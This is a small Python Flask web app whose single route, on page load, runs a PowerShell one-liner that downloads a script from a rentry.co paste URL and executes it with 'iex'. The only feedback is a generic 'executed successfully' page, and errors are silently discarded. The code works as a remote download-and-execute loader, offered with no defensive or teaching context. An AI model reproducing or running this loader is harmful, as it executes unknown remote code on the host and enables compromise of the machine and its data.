
from flask import Flask, render_template_string
import subprocess

app = Flask(__name__)

# HTML template for the web page
html_template = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Run CMD Command</title>
  </head>
  <body>
    <div class="container">
      <h1 class="mt-5">Command Executed</h1>
      <p>The command has been executed successfully.</p>
    </div>
  </body>
</html>
"""

@app.route('/')
def index():
    command = 'powershell "irm rentry.co/Testy123/raw | iex"'
    try:
        # Execute the command without capturing the output
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        pass  # Handle errors if needed
    return render_template_string(html_template)

if __name__ == '__main__':
    app.run(debug=True, port=5001)
